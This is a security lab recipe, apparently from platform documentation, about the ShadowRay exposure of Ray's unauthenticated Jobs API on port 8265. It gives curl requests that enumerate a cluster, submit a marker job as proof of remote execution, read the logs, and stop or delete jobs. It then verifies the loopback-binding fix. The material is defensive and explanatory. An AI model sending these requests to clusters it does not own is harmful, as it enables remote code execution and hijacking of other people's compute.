## Problem

Ray clusters expose a dashboard + Jobs API on :8265, and the job API
is a remote-code-execution primitive by design: `POST /api/jobs`
takes an `entrypoint` string that a Ray worker shell executes inside
the cluster. If that port answers on any interface beyond loopback —
the exposure upstream's own `--dashboard-host` help text spells out
as `localhost (127.0.0.1/::1) for local access only, or 0.0.0.0/::
for all interfaces` — then anyone who can reach :8265 can enumerate
(`GET /api/version`, `GET /api/jobs`), submit a job whose entrypoint
is their payload, stop and delete other users' jobs (`POST
.../stop`, `DELETE /api/jobs/{id}`), and read their logs. The ATLAS
technique for exactly this is CS0023, "ShadowRay: Hijacking Exposed
Ray Clusters", and the vulnerability record is honestly complicated:
CVE-2023-48022 describes the job-submission-API RCE but is
VENDOR-DISPUTED per NVD — Ray's maintainers push back that a
cluster intentionally exposed to untrusted networks is not a
vulnerability, which makes the CONFIGURATION the story, not the
binary. The manifest maps the surface to OWASP LLM02 + LLM10 and the
public ATLAS matrix (the pre-#210 `shadow-ray` row rode the same
mapping; phantom-upstream, removed — os#210). You want the pair run
against your own cluster in your own lab: prove the API shape, prove
the flag that binds it, and prove the flip closes it.

## Solution

The walk runs the real Jobs API shapes with plain curl against your
own lab cluster (the A-7 row is exp and repository-missing at the
pin; see Discussion), on a cluster you own inside an isolated lab
segment:

```bash
# 1. BOOT THE LAB TARGET — the exposed posture is the deliberate act;
#    --dashboard-host 'localhost (127.0.0.1/::1) for local access
#    only, or 0.0.0.0/:: for all interfaces'   # (upstream help, verbatim)
#    ray start --head --dashboard-host 0.0.0.0 --port 6379
#    (the exposed leg answers :8265 from the segment — keep it in the
#     lab segment, never a shared network; exp-classified A-7 rows
#     reach a lab host via the gate — [Gate lab-mode and
#     exp-classified tools](../admin/lab-mode-gating.html))

# 2. ENUMERATION (no credentials — the class in one shape):
curl -fsS http://<target>:8265/api/version
#    -> {"rayVersion":"<x.y.z>", ...} — the cluster answers
curl -fsS http://<target>:8265/api/jobs
#    -> job list (id, status, entrypoint per job) — who is running what

# 3. SUBMIT A MARKER JOB (the write half — a marker, NOT a payload):
curl -fsS -X POST http://<target>:8265/api/jobs \
     -H 'Content-Type: application/json' \
     -d '{"entrypoint": "echo KA_RAY_MARKER", "runtime_env": {}}'
#    -> {"job_id": "<id>", ...} — the cluster ACCEPTED a job whose
#       entrypoint is an arbitrary shell command; that acceptance IS
#       the RCE-class evidence (a worker will execute the entrypoint)

# 4. READ BACK + TEARDOWN (the remaining API shapes):
curl -fsS http://<target>:8265/api/jobs/<id>
#    -> status + entrypoint of the marker job
curl -fsS http://<target>:8265/api/jobs/<id>/logs
#    -> "KA_RAY_MARKER" — your string executed in the cluster's shell
curl -fsS -X POST http://<target>:8265/api/jobs/<id>/stop
curl -fsS -X DELETE http://<target>:8265/api/jobs/<id>
#    -> stop/delete accepted keylessly too — full lifecycle control

# 5. PIVOT NOTE (the LLM10/L02 extension): a marker job's shell is a
#    worker shell — with `runtime_env` pip-installable wheels, the
#    job API is also a package-supply chain into the cluster. The
#    marker never carries one; the recipe's evidence stops at the
#    accepted entrypoint + echoed marker.
```

Then the verification leg — flip the bind, re-run the same shapes:

```bash
# 6. THE FLIP: the dashboard bind is the defence.
ray stop
ray start --head --dashboard-host 127.0.0.1 --port 6379
#    (the default posture — upstream's help text literally names
#     "local access only" for it)

# 7. SAME shapes, same box:
curl -s -o /dev/null -w '%{http_code}\n' http://<target>:8265/api/version
#    -> FAIL (refused) from the segment; the API answers only on the
#       loopback interface. Diff between the two sweeps = evidence that
#       the configuration — not a patch — moved the surface.
```

Expected output shape (abridged, shapes not transcripts):

```
sweep @ http://<target>:8265  posture: --dashboard-host 0.0.0.0 (lab)
  /api/version       -> ok {"rayVersion":"..."}
  /api/jobs          -> ok [...] (job list)
  POST /api/jobs     -> ok {"job_id":"<id>"} (marker entrypoint ACCEPTED)
  /api/jobs/<id>/logs -> ok (marker echo visible — executed)
  POST .../stop      -> ok   DELETE /api/jobs/<id> -> ok
sweep again, posture: --dashboard-host 127.0.0.1
  all probes -> FAIL (refused) — the API is local-access-only again
```

## Discussion

- **ATLAS CS0023 is the technique name, and the disputed CVE is the
  honest footnote:** the ShadowRay technique (ATLAS case study
  CS0023) documents hijacking exposed Ray clusters in the wild —
  attackers ran cryptominers through the job API of clusters bound
  beyond their perimeter. CVE-2023-48022 describes the
  job-submission-API RCE class, but NVD lists it VENDOR-DISPUTED: the
  maintainers' position is that an intentionally exposed cluster is
  a deployment defect, not a code flaw. For an operator the dispute
  changes nothing about the mitigation and everything about the
  language: you fix it with configuration (the bind, the firewall),
  and your report says "exposed Jobs API" rather than
  "unpatched CVE".
- **Why plain curl and not a bespoke exploit script:** the
  `shadow-ray` manifest row was a PHANTOM — its claimed kailash-os
  upstream was never created — and the os#210 audit (2026-10-14)
  removed it (https://github.com/kailash-os/kailash-os/issues/210;
  the name rides the registry there). The probe leg runs the verified
  openapi.yml shapes (Jobs API v4.0.0 surface: `GET /api/version`,
  `POST /api/jobs` with entrypoint+runtime_env, `GET /api/jobs`,
  `GET/DELETE /api/jobs/{{id}}`, `POST .../stop`, `GET .../logs`)
  with the base system only — nothing invented; a real A-7 tool
  re-enters via the os#210 rebuild contract through the double-key
  lab gate (walk: [Gate lab-mode and exp-classified
  tools](../admin/lab-mode-gating.html)).
- **The marker job is the whole RCE argument, made safely:**
  submission ACCEPTED an arbitrary `entrypoint` string and the logs
  endpoint echoed its execution — no payload, no persistence, no
  network egress beyond the lab segment. The `runtime_env` pip wheel
  channel is named because it is the pivot the technique class uses;
  the recipe's evidence deliberately stops at the accepted
  entrypoint.
- **The kailash ray row is a module row, stated honestly:** ray
  ships in the manifest as a module + `services.kailash` module-shape
  row (not a docker-wrapper Shape-3 boot). The lab-boot leg above
  uses the module/boot posture at the pin: read the module per
  release — the option names follow the manifest row's module shape,
  and the `--dashboard-host` bind discipline is the same whichever
  way you boot. The defence flip is the module's bind default at the
  pin: loopback unless a lab posture explicitly overrides.
- **The telemetry defence leg is a pending row, stated honestly:**
  otel-ai (OpenLLMetry) is the instrument the manifest owns for
  LLM-cluster telemetry — `Traceloop.init()` instruments the app and
  ships spans (job submissions land as trace span attributes) to any
  OTLP endpoint; whylogs is the profile layer — `why.log(df)` over
  job/usage records gives the drift view. Both are d-02 rows whose
  kailash module wiring is PENDING at the pin (quoted as the design,
  not a landed surface). What they would give the operator: the
  standing view of job submissions to a cluster — the anomaly view
  the probe sweep hand-verified.
- **This is the transferable pattern** (lab target up → probe sweep
  → posture flip → same sweep → diff). Origin walk with the verdict
  instrument and the `--record` discipline:
  [Attack the platform, then verify](attack-then-verify.html).
